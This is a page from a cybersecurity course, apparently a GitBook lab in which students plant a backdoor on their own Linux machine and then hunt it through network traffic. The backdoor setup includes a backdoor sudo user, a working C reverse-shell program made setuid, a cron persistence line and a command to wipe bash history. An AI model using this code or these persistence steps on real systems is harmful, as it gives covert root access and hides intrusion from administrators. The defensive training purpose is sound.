
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>Linux Network Hunting Lab Â· GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-pro/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-bibtex-indexed-cite/style.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-page-footer-ex/style/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-expandable-chapters-small/expandable-chapters-small.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="4-LinuxProcessHunting.html" />
    
    
    <link rel="prev" href="2-ThreatHuntingBasics.html" />
    

    <style>
    @media only screen and (max-width: 640px) {
        .book-header .hidden-mobile {
            display: none;
        }
    }
    </style>
    <script>
        window["gitbook-plugin-github-buttons"] = {"buttons":[{"user":"hoppersroppers","repo":"ctf","type":"star","size":"small","count":true}]};
    </script>

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        <li class="header">Secure Yourself Now</li>
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../SecureYourselfNow/0-Introduction.html">
            
                <a href="../SecureYourselfNow/0-Introduction.html">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="../SecureYourselfNow/1-Passwords.html">
            
                <a href="../SecureYourselfNow/1-Passwords.html">
            
                    
                    Passwords
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="../SecureYourselfNow/2-WhoisTrackingYou.html">
            
                <a href="../SecureYourselfNow/2-WhoisTrackingYou.html">
            
                    
                    Who is Tracking You
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="../SecureYourselfNow/3-UpdateYourComputerandScan.html">
            
                <a href="../SecureYourselfNow/3-UpdateYourComputerandScan.html">
            
                    
                    Update Your Computer and Scan
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6" data-path="../SecureYourselfNow/4-UpdatingYourLab.html">
            
                <a href="../SecureYourselfNow/4-UpdatingYourLab.html">
            
                    
                    Updating Your Lab
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7" data-path="../SecureYourselfNow/6-JoinourChatRooms.html">
            
                <a href="../SecureYourselfNow/6-JoinourChatRooms.html">
            
                    
                    Join our Chat Rooms
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Passwords</li>
        
        
    
        <li class="chapter " data-level="2.1" data-path="../Passwords/0-Hashing.html">
            
                <a href="../Passwords/0-Hashing.html">
            
                    
                    Hashing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2" data-path="../Passwords/1-CrackingPasswords.html">
            
                <a href="../Passwords/1-CrackingPasswords.html">
            
                    
                    Cracking Passwords
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">How Hacking Works</li>
        
        
    
        <li class="chapter " data-level="3.1" data-path="../HowHackingWorks/0-NetworkArchitectureNotes.html">
            
                <a href="../HowHackingWorks/0-NetworkArchitectureNotes.html">
            
                    
                    Network Architecture Notes
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2" data-path="../HowHackingWorks/1-CyberKillchain.html">
            
                <a href="../HowHackingWorks/1-CyberKillchain.html">
            
                    
                    Cyber Killchain
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.3" data-path="../HowHackingWorks/2-PostExploitation.html">
            
                <a href="../HowHackingWorks/2-PostExploitation.html">
            
                    
                    PostExploitation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.4" data-path="../HowHackingWorks/3-MalwareTypes.html">
            
                <a href="../HowHackingWorks/3-MalwareTypes.html">
            
                    
                    Malware Types
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.5" data-path="../HowHackingWorks/4-JobRolesRedvsBlue.html">
            
                <a href="../HowHackingWorks/4-JobRolesRedvsBlue.html">
            
                    
                    Job Roles  Red vs Blue
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.6" data-path="../HowHackingWorks/5-PhishingCaseStudy.html">
            
                <a href="../HowHackingWorks/5-PhishingCaseStudy.html">
            
                    
                    Phishing Case Study
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.7" data-path="../HowHackingWorks/6-ManMachineintheMiddle.html">
            
                <a href="../HowHackingWorks/6-ManMachineintheMiddle.html">
            
                    
                    ManMachine in the Middle
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Real World</li>
        
        
    
        <li class="chapter " data-level="4.1" data-path="../RealWorld/0-LinuxPasswordReset.html">
            
                <a href="../RealWorld/0-LinuxPasswordReset.html">
            
                    
                    Linux Password Reset
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2" data-path="../RealWorld/1-WindowsPasswordReset.html">
            
                <a href="../RealWorld/1-WindowsPasswordReset.html">
            
                    
                    Windows Password Reset
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3" data-path="../RealWorld/2-TechnicalAttacks.html">
            
                <a href="../RealWorld/2-TechnicalAttacks.html">
            
                    
                    Technical Attacks
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Defense Against the Dark Arts</li>
        
        
    
        <li class="chapter " data-level="5.1" data-path="0-HowtoTellifYouareHacked.html">
            
                <a href="0-HowtoTellifYouareHacked.html">
            
                    
                    How to Tell if You are Hacked
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2" data-path="1-AntiVirusBasics.html">
            
                <a href="1-AntiVirusBasics.html">
            
                    
                    AntiVirus Basics
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.3" data-path="2-ThreatHuntingBasics.html">
            
                <a href="2-ThreatHuntingBasics.html">
            
                    
                    Threat Hunting Basics
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="5.4" data-path="3-LinuxNetworkHuntingLab.html">
            
                <a href="3-LinuxNetworkHuntingLab.html">
            
                    
                    Linux Network Hunting Lab
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.5" data-path="4-LinuxProcessHunting.html">
            
                <a href="4-LinuxProcessHunting.html">
            
                    
                    Linux Process Hunting
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.6" data-path="5-WindowsNetworkThreatHunting.html">
            
                <a href="5-WindowsNetworkThreatHunting.html">
            
                    
                    Windows Network Threat Hunting
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.7" data-path="6-WindowsProcessHunting.html">
            
                <a href="6-WindowsProcessHunting.html">
            
                    
                    Windows Process Hunting
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.8" data-path="7-MalwareRemoval.html">
            
                <a href="7-MalwareRemoval.html">
            
                    
                    Malware Removal
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">The Dark Arts</li>
        
        
    
        <li class="chapter " data-level="6.1" data-path="../TheDarkArts/0-AttackerMindset.html">
            
                <a href="../TheDarkArts/0-AttackerMindset.html">
            
                    
                    Attacker Mindset
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.2" data-path="../TheDarkArts/1-ResponsibleOffensiveSecurity.html">
            
                <a href="../TheDarkArts/1-ResponsibleOffensiveSecurity.html">
            
                    
                    Responsible Offensive Security
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3" data-path="../TheDarkArts/2-ReconandEnumeration.html">
            
                <a href="../TheDarkArts/2-ReconandEnumeration.html">
            
                    
                    Recon and Enumeration
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.4" data-path="../TheDarkArts/3-BabySteps.html">
            
                <a href="../TheDarkArts/3-BabySteps.html">
            
                    
                    Baby Steps
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.5" data-path="../TheDarkArts/4-LinuxPrivesc.html">
            
                <a href="../TheDarkArts/4-LinuxPrivesc.html">
            
                    
                    Linux Privesc
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.6" data-path="../TheDarkArts/5-WindowsPrivesc.html">
            
                <a href="../TheDarkArts/5-WindowsPrivesc.html">
            
                    
                    Windows Privesc
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.7" data-path="../TheDarkArts/6-BabyMetasploit.html">
            
                <a href="../TheDarkArts/6-BabyMetasploit.html">
            
                    
                    Baby Metasploit
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Securing Yourself</li>
        
        
    
        <li class="chapter " data-level="7.1" data-path="../SecuringYourself/0-DontGetHacked.html">
            
                <a href="../SecuringYourself/0-DontGetHacked.html">
            
                    
                    Dont Get Hacked
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.2" data-path="../SecuringYourself/1-SecuringWindowsAccordingtoTaylorSwift.html">
            
                <a href="../SecuringYourself/1-SecuringWindowsAccordingtoTaylorSwift.html">
            
                    
                    Securing Windows According to Taylor Swift
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.3" data-path="../SecuringYourself/2-SecuringLinuxAccordingtoDennis.html">
            
                <a href="../SecuringYourself/2-SecuringLinuxAccordingtoDennis.html">
            
                    
                    Securing Linux According to Dennis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.4" data-path="../SecuringYourself/3-SupplyChainAttacks.html">
            
                <a href="../SecuringYourself/3-SupplyChainAttacks.html">
            
                    
                    Supply Chain Attacks
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.5" data-path="../SecuringYourself/4-HowtoHelpOthersBeSafeOnline.html">
            
                <a href="../SecuringYourself/4-HowtoHelpOthersBeSafeOnline.html">
            
                    
                    How to Help Others Be Safe Online
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >Linux Network Hunting Lab</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="linux-network-hunting-lab">Linux Network Hunting Lab</h1>
<p><iframe allowfullscreen height="360" src="https://www.youtube.com/embed/WSN4e7_1VJw?wmode=opaque" width="640"></iframe><br>In order for us to do a local hunt for a malicious Linux process, we
have to make ourselves a malicious process.</p>
<h2 id="create-evil">Create Evil</h2>
<p>First let&apos;s pretend we are a bad guy who just got access to a box and
are taking our first persistence steps.</p>
<pre><code>$ adduser backdooruser (and create new user) 
$ usermod -aG sudo backdooruser
 $ su - backdooruser
</code></pre><p>Next place the following code for a reverse shell into a file named
mal.c and save it in your /bin directory:</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;

int main(void){
int port = 1337;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;      
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);

connect(sockt, (struct sockaddr *) &amp;revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {&quot;/bin/sh&quot;, NULL};
execve(&quot;/bin/sh&quot;, argv, NULL);

return 0;      
}
</code></pre><p>Then run the following commands:</p>
<pre><code>$ gcc mal.c -o /bin/mal 
$ rm mal.c $ sudo chmod u+s /bin/mal 
$ sudo crontab -e
</code></pre><p>Add line to cron file and save to set up the cron job:</p>
<pre><code>*/5 * * * * /bin/mal
</code></pre><p>Once you have that done step out of the <code>su</code> back to your normal user
and run <code>$ nc -lp 1337</code> and in another window run <code>$ /bin/mal</code>.</p>
<p>You should have a root shell connect back. Confirm that this works
before moving forward.</p>
<p>Now let&apos;s clear out our command history with
<code>cat /dev/null &gt; ~/.bash_history</code>, because we are sneaky little backdoor
hiders.</p>
<p>Kill the connection and start listening again.</p>
<h1 id="network-hunting">Network Hunting</h1>
<p>We can use network traffic to identify evil, in fact, it just might be
the easiest way to initially detect something without having to go look
for it.</p>
<p>If malware is on your network, it is going to try to talk out to its
command and control server. There are plenty of ways to look at network
traffic, especially if you are a larger organization that has a security
monitoring setup like SecurityOnion.</p>
<h2 id="hunting-packet-captures">Hunting Packet Captures</h2>
<p>This is the more common form of network hunting. Rather than being on
the potentially compromised box itself, we can just look at the packets
captured and search through it to find evil. This is the bread and
butter of most organization&apos;s defensive posture.</p>
<p>Set up Wireshark and begin capturing on the localhost interface (this is
essential because your reverse shell is heading to 127.0.0.1 and will
not wind up leaving the main interface. Wait for your reverse shell to
connect and then use the nc listener to run a few commands. Use &#x2018;wget
<a href="https://st2.depositphotos.com/1000393/6507/i/950/depositphotos_65076917-stock-photo-hacker-and-terrorism-fight.jpg&#x2019;" target="_blank">https://st2.depositphotos.com/1000393/6507/i/950/depositphotos_65076917-stock-photo-hacker-and-terrorism-fight.jpg&#x2019;</a>
as one of your commands.</p>
<p>Use the Wireshark capture you generated to find the malicious process
and data that was passed back and forth.</p>
<h2 id="local-network-hunting">Local Network Hunting</h2>
<p>Locally, it should be easy to identify both your listening and connected
processes using the following commands. They all do something slightly
different but are very useful.</p>
<ul>
<li>netstat -antp</li>
<li>netstat -la | grep &#x201C;LISTEN&#x201D; &#x201C;ESTABLISHED&#x201D;</li>
<li>lsof -u</li>
<li>lsof -i</li>
</ul>
<p>In the real world, we could set up a log monitoring system that would
check these sort of things on a regular basis but that is overkill for a
single host.</p>
<h2 id="everyday-hunting">Everyday Hunting</h2>
<p>For everyday use on a Linux box I recommend the tool ntopng and
Wireshark for this purpose. ntop identifies processes making network
connections and alerts on them. If the process doesn&apos;t make sense when
it pops up, go to Wireshark and open up the stream to see if it makes
sense.</p>
<p>Assignment:</p>
<ol>
<li>Make sure you understand what the attacker did and why. Try to
understand what the effect was of each command the attacker ran.
This is some pretty complicated stuff.</li>
<li>Write up a minimal report on the malicious actions taken by the
attacker as well as information about the backdoor, according to the
packet capture and the networking commands used. Include information
from the command outputs&apos; and Wireshark to provide detail. Do not go
any further than this lab&apos;s content in your writeup.</li>
</ol>
<footer class="page-footer-ex"> <span class="page-footer-ex-copyright"> Hoppers Roppers 2024 </span> &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; <span class="page-footer-ex-footer-update"> Date&#xFF1A; 2024-02-25 22:04:50 </span> </footer>
                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="2-ThreatHuntingBasics.html" class="navigation navigation-prev " aria-label="Previous page: Threat Hunting Basics">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="4-LinuxProcessHunting.html" class="navigation navigation-next " aria-label="Next page: Linux Process Hunting">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"Linux Network Hunting Lab","level":"5.4","depth":1,"next":{"title":"Linux Process Hunting","level":"5.5","depth":1,"path":"DefenseAgainsttheDarkArts/4-LinuxProcessHunting.md","ref":"DefenseAgainsttheDarkArts/4-LinuxProcessHunting.md","articles":[]},"previous":{"title":"Threat Hunting Basics","level":"5.3","depth":1,"path":"DefenseAgainsttheDarkArts/2-ThreatHuntingBasics.md","ref":"DefenseAgainsttheDarkArts/2-ThreatHuntingBasics.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-pro","-sharing","github-buttons","editlink","ga","-highlight","bibtex-indexed-cite","page-footer-ex","splitter","copy-code-button","expandable-chapters-small"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"editlink":{"label":"Edit","multilingual":false,"base":"https://github.com/hoppersroppers/security/blob/master"},"page-footer-ex":{"copyright":"Hoppers Roppers 2024","markdown":true,"update_format":"YYYY-MM-DD HH:mm:ss","update_label":"Dateï¼"},"splitter":{},"search-pro":{"cutWordLib":"nodejieba","defineWord":["Gitbook Use"]},"fontsettings":{"theme":"white","family":"sans","size":2},"anchor-navigation-ex":{"showLevel":false},"bibtex-indexed-cite":{"path":"/"},"github-buttons":{"buttons":[{"user":"hoppersroppers","repo":"ctf","type":"star","size":"small","count":true}]},"expandable-chapters-small":{},"copy-code-button":{},"ga":{"configuration":"auto","token":"UA-151638088-2"},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","author":"","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"bibCount":0,"variables":{},"title":"","bib":[],"gitbook":"*"},"file":{"path":"DefenseAgainsttheDarkArts/3-LinuxNetworkHuntingLab.md","mtime":"2024-02-25T22:04:50.071Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2024-02-25T22:05:24.477Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search-pro/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-github-buttons/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-editlink/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-ga/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-copy-code-button/toggle.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-expandable-chapters-small/expandable-chapters-small.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

